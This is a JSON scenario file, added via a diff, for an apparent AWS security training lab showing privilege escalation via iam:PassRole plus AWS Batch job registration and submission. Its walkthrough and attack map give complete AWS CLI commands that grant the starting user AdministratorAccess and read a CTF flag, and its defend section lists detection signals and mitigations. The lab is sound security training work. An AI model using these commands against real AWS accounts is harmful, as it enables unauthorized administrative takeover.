@@ -1,0 +1,239 @@
+{
+  "displayName": "AWS Batch Job Submission to Admin",
+  "name": "batch-001-iam-passrole+batch-registerjobdefinition+batch-submitjob",
+  "description": "Pass privileged role to AWS Batch job definition and submit a job that grants the starting user administrative access",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": "batch-001",
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "Privilege Escalation",
+  "subCategory": "new-passrole",
+  "pathType": "one-hop",
+  "target": "to-admin",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation",
+      "TA0002 - Execution"
+    ],
+    "techniques": [
+      "T1078.004 - Valid Accounts: Cloud Accounts",
+      "T1610 - Deploy Container"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_privesc_one_hop_to_admin_batch_001_iam_passrole_batch_registerjobdefinition_batch_submitjob",
+    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/batch-001-iam-passrole+batch-registerjobdefinition+batch-submitjob"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/batch-001-iam-passrole+batch-registerjobdefinition+batch-submitjob",
+  "schemaVersion": "4.6.1",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-batch-001-to-admin-starting-user",
+        "required": [
+          {
+            "permission": "iam:PassRole",
+            "resource": "arn:aws:iam::*:role/pl-prod-batch-001-to-admin-admin-role",
+            "description": "allows passing the admin role to the Batch service as the job role ARN in the job definition"
+          },
+          {
+            "permission": "iam:PassRole",
+            "resource": "arn:aws:iam::*:role/pl-prod-batch-001-to-admin-execution-role",
+            "description": "allows passing the ECS task execution role to the Batch service when registering the job definition"
+          },
+          {
+            "permission": "batch:RegisterJobDefinition",
+            "resource": "*",
+            "description": "allows registering a new Batch job definition specifying the admin role as `jobRoleArn`"
+          },
+          {
+            "permission": "batch:SubmitJob",
+            "resource": "*",
+            "description": "allows submitting the registered job definition to the existing Fargate job queue"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "batch:DescribeJobs",
+            "purpose": "monitor job execution status and verify job completion"
+          },
+          {
+            "permission": "batch:DescribeJobQueues",
+            "purpose": "discover existing job queues available for job submission"
+          },
+          {
+            "permission": "batch:DescribeComputeEnvironments",
+            "purpose": "discover existing compute environments"
+          },
+          {
+            "permission": "batch:DeregisterJobDefinition",
+            "purpose": "clean up the job definition after the demonstration"
+          },
+          {
+            "permission": "iam:ListAttachedUserPolicies",
+            "purpose": "verify privilege escalation success by listing attached policies"
+          }
+        ]
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-batch-001-to-admin-starting-user` IAM user to the `pl-prod-batch-001-to-admin-admin-role` administrative role by registering an AWS Batch job definition with the admin role as the `jobRoleArn`, submitting the job, and having the container execute with administrative credentials to attach `AdministratorAccess` to the starting user.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-batch-001-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-admin-role`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew tap DataDog/pathfinding-labs https://github.com/DataDog/pathfinding-labs\n   brew install DataDog/pathfinding-labs/plabs\n   ```\n   Or with Go 1.25+ installed:\n   ```bash\n   go install github.com/DataDog/pathfinding-labs/cmd/plabs@latest\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable batch-001-to-admin\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `batch-001-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-batch-001-to-admin-starting-user` | Scenario-specific starting user with access keys, PassRole, and Batch permissions |\n| `arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-admin-role` | Administrative role (trusts `ecs-tasks.amazonaws.com`) passed as `jobRoleArn` to the Batch job definition |\n| `arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-execution-role` | ECS task execution role for pulling container images and sending logs to CloudWatch |\n| Fargate compute environment | AWS Batch compute environment using Fargate for serverless container execution |\n| Job queue | AWS Batch job queue associated with the Fargate compute environment |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/batch-001-to-admin` | CTF flag stored in SSM Parameter Store; retrievable by any admin-equivalent principal |",
+      "demoAttack": {
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Register a Batch job definition with the admin role as the `jobRoleArn`\n4. Submit the job to the existing Fargate job queue\n5. Wait for the Batch job to complete execution\n6. Verify successful privilege escalation by demonstrating admin access\n7. Capture the CTF flag from SSM Parameter Store using the newly gained admin permissions",
+        "resourcesCreated": "- AWS Batch job definition with the admin role as `jobRoleArn`\n- `AdministratorAccess` managed policy attached to `pl-prod-batch-001-to-admin-starting-user`",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo batch-001-iam-passrole+batch-registerjobdefinition+batch-submitjob\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `batch-001-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup batch-001-iam-passrole+batch-registerjobdefinition+batch-submitjob\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `batch-001-to-admin` in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable batch-001-to-admin\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `batch-001-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- IAM user with `iam:PassRole` permission on a role that has administrative permissions\n- IAM user with `batch:RegisterJobDefinition` and `batch:SubmitJob` permissions combined with `iam:PassRole`, forming a privilege escalation path\n- IAM role with `AdministratorAccess` or equivalent permissions that trusts `ecs-tasks.amazonaws.com` and can be passed to Batch job definitions\n- Privilege escalation path from IAM user to admin via AWS Batch job submission",
+        "prevention": "- Restrict `iam:PassRole` using the `iam:PassedToService` condition key to limit which services a role can be passed to (e.g., `\"iam:PassedToService\": \"ecs-tasks.amazonaws.com\"`)\n- Scope `iam:PassRole` resource constraints to non-privileged roles only; deny passing roles with `AdministratorAccess` or broad IAM permissions to Batch\n- Implement SCPs that deny `batch:RegisterJobDefinition` when the request includes a `jobRoleArn` referencing a privileged role\n- Use IAM Access Analyzer to automatically detect privilege escalation paths involving `iam:PassRole` and Batch job submission\n- Grant `batch:RegisterJobDefinition` and `batch:SubmitJob` only to automation accounts or roles with a demonstrated need; treat these as high-risk permissions in any IAM user policy\n- Enable AWS Config rules to alert when Batch job definitions are registered with roles that carry administrative permissions"
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `batch:RegisterJobDefinition` -- new Batch job definition registered; inspect `requestParameters.containerProperties.jobRoleArn` \u2014 a privileged role ARN here is the CloudTrail signal for PassRole abuse via Batch; high severity when the role has administrative permissions\n- `batch:SubmitJob` -- Batch job submitted; correlate with a preceding `RegisterJobDefinition` call from the same principal to identify abuse of newly registered definitions\n- `iam:AttachUserPolicy` -- managed policy attached to an IAM user from within a Batch job context; critical when the policy is `AdministratorAccess` and the caller is an ECS task role\n- `iam:PutUserPolicy` -- inline policy added to an IAM user from within a Batch job context; monitor for policies granting broad permissions",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [AWS Batch Job Roles Documentation](https://docs.aws.amazon.com/batch/latest/userguide/job_roles.html) -- explains how `jobRoleArn` works and why it must trust `ecs-tasks.amazonaws.com`\n- [AWS IAM PassRole Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html) -- explains PassRole mechanics and how to restrict it with `iam:PassedToService`\n- [Rhino Security Labs - AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) -- comprehensive overview of IAM privilege escalation techniques including PassRole patterns\n- [pathfinding.cloud/paths/batch-001](https://pathfinding.cloud/paths/batch-001) -- documented attack path for this scenario",
+    "solution": "# Guided Walkthrough: Privilege Escalation via iam:PassRole + batch:RegisterJobDefinition + batch:SubmitJob\n\nThis scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `batch:RegisterJobDefinition`, and `batch:SubmitJob` permissions can register an AWS Batch job definition that passes a privileged IAM role as the `jobRoleArn`, submit the job, and have the resulting container use those administrative credentials to grant the starting user `AdministratorAccess`.\n\nAWS Batch orchestrates containerized workloads on top of Amazon ECS (or ECS on Fargate). When a job definition specifies a `jobRoleArn`, ECS assumes that role for the task \u2014 meaning the container receives the role's credentials automatically through the ECS container credential provider at `169.254.170.2`. An attacker who can pass a privileged role to Batch and submit jobs effectively executes arbitrary AWS API calls as that role without ever calling `sts:AssumeRole` directly.\n\n## The Challenge\n\nYou start as `pl-prod-batch-001-to-admin-starting-user` \u2014 an IAM user whose credentials were provided via Terraform outputs. At first glance these permissions look like they belong to a data or ML engineer: the ability to register Batch job definitions and submit jobs, plus `iam:PassRole` on a specific role. Your goal is to reach full administrator access.\n\nThe target is `pl-prod-batch-001-to-admin-admin-role`, an IAM role carrying `AdministratorAccess`. You cannot assume it directly \u2014 there is no `sts:AssumeRole` permission in your policy, and even if there were, the role's trust policy only permits `ecs-tasks.amazonaws.com`. But you can pass it to something else.\n\n## Reconnaissance\n\nStart by confirming who you are and what region you are operating in:\n\n```bash\naws sts get-caller-identity\n```\n\nInspect the inline policy attached to your user to understand the full permission set:\n\n```bash\naws iam list-user-policies --user-name pl-prod-batch-001-to-admin-starting-user\naws iam get-user-policy --user-name pl-prod-batch-001-to-admin-starting-user \\\n    --policy-name pl-prod-batch-001-to-admin-required-permissions\n```\n\nYou will see `iam:PassRole` scoped to the admin and execution role ARNs, plus `batch:RegisterJobDefinition` and `batch:SubmitJob`. You also have helpful permissions \u2014 `batch:DescribeJobs`, `batch:DescribeJobQueues`, `batch:DescribeComputeEnvironments`, `iam:ListAttachedUserPolicies` \u2014 for discovery and monitoring. Discover the existing job queue:\n\n```bash\naws batch describe-job-queues --query 'jobQueues[*].{Name:jobQueueName,State:state}'\n```\n\n## Exploitation\n\n### Step 1: Register a Batch job definition with the admin role\n\nRegister a job definition using the `amazon/aws-cli` image. Pass the admin role as `jobRoleArn` and the execution role as `executionRoleArn`. Set the container command to attach `AdministratorAccess` to the starting user \u2014 the container will run this command as the admin role.\n\n```bash\nACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)\nREGION=\"us-east-1\"  # adjust to your deployed region\nSTARTING_USER=\"pl-prod-batch-001-to-admin-starting-user\"\nADMIN_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-batch-001-to-admin-admin-role\"\nEXECUTION_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-batch-001-to-admin-execution-role\"\nJOB_DEF_NAME=\"pl-batch-001-privesc-job-def\"\n\naws batch register-job-definition \\\n    --region \"$REGION\" \\\n    --job-definition-name \"$JOB_DEF_NAME\" \\\n    --type container \\\n    --platform-capabilities FARGATE \\\n    --container-properties \"{\n        \\\"image\\\": \\\"amazon/aws-cli:latest\\\",\n        \\\"jobRoleArn\\\": \\\"$ADMIN_ROLE_ARN\\\",\n        \\\"executionRoleArn\\\": \\\"$EXECUTION_ROLE_ARN\\\",\n        \\\"resourceRequirements\\\": [\n            {\\\"type\\\": \\\"VCPU\\\", \\\"value\\\": \\\"0.25\\\"},\n            {\\\"type\\\": \\\"MEMORY\\\", \\\"value\\\": \\\"512\\\"}\n        ],\n        \\\"networkConfiguration\\\": {\\\"assignPublicIp\\\": \\\"ENABLED\\\"},\n        \\\"command\\\": [\n            \\\"iam\\\", \\\"attach-user-policy\\\",\n            \\\"--user-name\\\", \\\"$STARTING_USER\\\",\n            \\\"--policy-arn\\\", \\\"arn:aws:iam::aws:policy/AdministratorAccess\\\"\n        ]\n    }\"\n```\n\nNote the `revision` field in the response \u2014 you will need it for job submission.\n\n### Step 2: Submit the job to the existing queue\n\nSubmit the job to the Fargate job queue. Batch will schedule the container to run on Fargate.\n\n```bash\nJOB_DEF_REVISION=1  # replace with the revision from the previous step\nJOB_QUEUE=\"pl-prod-batch-001-to-admin-job-queue\"\n\naws batch submit-job \\\n    --region \"$REGION\" \\\n    --job-name \"pl-batch-001-privesc-job\" \\\n    --job-queue \"$JOB_QUEUE\" \\\n    --job-definition \"${JOB_DEF_NAME}:${JOB_DEF_REVISION}\"\n```\n\nNote the `jobId` in the response.\n\n### Step 3: Wait for the job to complete\n\nFargate must provision a container instance before running the job. Poll the job status every 15 seconds until it shows `SUCCEEDED`. This typically takes 1-3 minutes.\n\n```bash\nJOB_ID=\"<job-id from previous step>\"\n\naws batch describe-jobs --region \"$REGION\" --jobs \"$JOB_ID\" \\\n    --query 'jobs[0].status' --output text\n```\n\nIf the status shows `FAILED`, check the status reason:\n\n```bash\naws batch describe-jobs --region \"$REGION\" --jobs \"$JOB_ID\" \\\n    --query 'jobs[0].statusReason' --output text\n```\n\n## Verification\n\nOnce the job succeeds, wait 15 seconds for IAM policy propagation, then verify that `AdministratorAccess` was attached to the starting user:\n\n```bash\nsleep 15\naws iam list-attached-user-policies --user-name pl-prod-batch-001-to-admin-starting-user\n```\n\nConfirm admin access using the starting user's credentials:\n\n```bash\naws iam list-users --max-items 3\n```\n\nIf this succeeds, you have achieved administrator access.\n\n## Capture the Flag\n\nAdmin access isn't the finish line \u2014 the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.\n\nUsing your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:\n\n```bash\naws ssm get-parameter \\\n    --name /pathfinding-labs/flags/batch-001-to-admin \\\n    --query 'Parameter.Value' \\\n    --output text\n# flag{...}  \u2014 your scenario-specific flag value\n```\n\nThe value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them \u2014 only the scenario ID in the path changes.\n\n## What Happened\n\nYou exploited a privilege escalation path that is easy to overlook during IAM reviews. The `iam:PassRole` permission is often granted to data or ML engineers so they can assign execution roles to compute workloads. When combined with `batch:RegisterJobDefinition` and `batch:SubmitJob`, it becomes a full code execution primitive: you can launch arbitrary container images that run under any role you can pass, without ever calling `sts:AssumeRole` yourself.\n\nThe key subtlety is that AWS Batch relies on Amazon ECS under the hood. The `jobRoleArn` is an ECS task role \u2014 it must trust `ecs-tasks.amazonaws.com`. When Batch runs the job, ECS injects the role's credentials into the container via the link-local metadata service. The container has no knowledge that it was launched by Batch; it simply finds an IAM role in the environment and uses it.\n\nThis pattern appears in real environments where data teams are given flexible Batch permissions for ML training or ETL workloads. The fix is to ensure that any role passable to Batch carries only the minimum permissions needed for data operations \u2014 never administrative policies. The `iam:PassRole` permission should also be restricted with an `iam:PassedToService` condition key (e.g., `batch.amazonaws.com` or `ecs-tasks.amazonaws.com`) and ideally a resource condition scoped to specific role name patterns. CloudTrail events to monitor include `batch:RegisterJobDefinition` calls where the `jobRoleArn` references a privileged role.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-user",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-batch-001-to-admin-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer, compromising a CI/CD pipeline, discovering credentials in a public S3 bucket, or finding them hardcoded in source code.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole on a specific admin role plus batch:RegisterJobDefinition and batch:SubmitJob \u2014 enough to register a Batch job definition that runs as the admin role and submit it to an existing queue.\n"
+      },
+      {
+        "id": "batch-job",
+        "label": "Batch Job Container",
+        "type": "resource",
+        "subType": "batch-job",
+        "arn": "arn:aws:batch:{region}:{account_id}:job/pl-batch-001-privesc-job",
+        "description": "An AWS Batch job submitted to the Fargate compute environment. The job definition specifies the admin role as the jobRoleArn, so the ECS task running the container receives the admin role's credentials via the ECS container credential provider. The container image (amazon/aws-cli) runs an iam:AttachUserPolicy command as the admin role, granting the starting user AdministratorAccess.\n"
+      },
+      {
+        "id": "admin-role",
+        "label": "Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isAdmin": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-admin-role",
+        "description": "This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com. It is passed as the jobRoleArn in the registered Batch job definition. When the Batch job runs, ECS assumes this role for the container, giving the container full administrative permissions. The container uses those permissions to attach AdministratorAccess to the starting user, completing the privilege escalation.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/batch-001-to-admin",
+        "description": "The CTF flag for this scenario, stored as an SSM parameter in the victim account. Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is granted implicitly by AdministratorAccess). Your goal is to read this parameter using the admin access gained from the previous step.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-user",
+        "to": "batch-job",
+        "label": "iam:PassRole + batch:RegisterJobDefinition + batch:SubmitJob",
+        "description": "The starting user passes the admin role as the jobRoleArn when registering a Batch job definition. iam:PassRole is required for this because it associates a privileged IAM role with a compute workload. The user then submits the job to an existing Fargate job queue, causing Batch/ECS to launch a container that inherits the admin role's credentials.\n",
+        "hints": [
+          "Register a job definition using batch:RegisterJobDefinition with --type container --platform-capabilities FARGATE. Set jobRoleArn to the admin role ARN and executionRoleArn to the execution role ARN. The container command should be an AWS CLI iam:AttachUserPolicy call.",
+          "Submit the job to the existing queue using batch:SubmitJob. Poll batch:DescribeJobs until status is SUCCEEDED (Fargate provisioning takes 1-3 minutes).",
+          "Browse to https://pathfinding.cloud/paths/batch-001 for full technique details."
+        ],
+        "commands": [
+          {
+            "description": "Check your current identity",
+            "command": "aws sts get-caller-identity"
+          },
+          {
+            "description": "Register a Batch job definition with the admin role as jobRoleArn",
+            "command": "aws batch register-job-definition --job-definition-name pl-batch-001-privesc-job-def --type container --platform-capabilities FARGATE --container-properties '{\"image\":\"amazon/aws-cli:latest\",\"jobRoleArn\":\"arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-admin-role\",\"executionRoleArn\":\"arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-execution-role\",\"resourceRequirements\":[{\"type\":\"VCPU\",\"value\":\"0.25\"},{\"type\":\"MEMORY\",\"value\":\"512\"}],\"networkConfiguration\":{\"assignPublicIp\":\"ENABLED\"},\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-batch-001-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}'\n"
+          },
+          {
+            "description": "Submit the job to the queue",
+            "command": "aws batch submit-job --job-name pl-batch-001-privesc-job --job-queue pl-prod-batch-001-to-admin-job-queue --job-definition pl-batch-001-privesc-job-def:1\n"
+          },
+          {
+            "description": "Poll job status until SUCCEEDED",
+            "command": "aws batch describe-jobs --jobs <job-id> --query 'jobs[0].status' --output text"
+          }
+        ]
+      },
+      {
+        "from": "batch-job",
+        "to": "admin-role",
+        "label": "Container executes as admin role via ECS task credentials",
+        "description": "The Batch job container receives the admin role's credentials automatically through the ECS container credential provider (169.254.170.2). The container runs the AWS CLI iam:AttachUserPolicy command as the admin role, attaching AdministratorAccess to the starting user. After the job succeeds, wait 15 seconds for IAM policy propagation before verifying escalation.\n",
+        "hints": [],
+        "commands": [
+          {
+            "description": "Verify AdministratorAccess was attached to the starting user",
+            "command": "aws iam list-attached-user-policies --user-name pl-prod-batch-001-to-admin-starting-user"
+          },
+          {
+            "description": "Verify admin access with the starting user credentials",
+            "command": "aws iam list-users --max-items 3 --output table"
+          }
+        ]
+      },
+      {
+        "from": "admin-role",
+        "to": "ctf-flag",
+        "label": "Read CTF flag",
+        "description": "With administrator-equivalent permissions now attached to the starting user, retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all parameters in the account, so no additional permissions are needed beyond the admin access just gained.\n",
+        "hints": [
+          "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets.",
+          "Scenario flags live under a shared prefix in SSM Parameter Store \u2014 consider what a reasonable naming convention for this lab might look like.",
+          "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+        ],
+        "commands": [
+          {
+            "description": "Retrieve the CTF flag from SSM Parameter Store",
+            "command": "aws ssm get-parameter --name /pathfinding-labs/flags/batch-001-to-admin --query 'Parameter.Value' --output text"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "iam",
+    "batch"
+  ],
+  "slug": "batch-001",
+  "hasDemoTranscript": false
+}
